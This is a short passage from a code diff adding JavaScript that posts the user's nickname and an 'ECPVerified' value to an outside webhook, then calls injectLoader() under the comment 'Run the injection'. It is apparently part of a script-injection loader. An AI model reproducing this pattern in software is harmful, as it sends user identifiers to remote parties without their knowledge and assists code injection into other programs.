+        content: `${lastNickname} has entered the script\nECPVerified: ${ECPVerifiedContent}`
+    };
+    
+    fetch(webhookURL, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log("Webhook sent successfully!");
+        } else {
+            console.error("Failed to send webhook:", response.statusText);
+        }
+    })
+    .catch(error => {
+        console.error("Error sending webhook:", error);
+    });
+})();
+
+// Run the injection
+injectLoader();
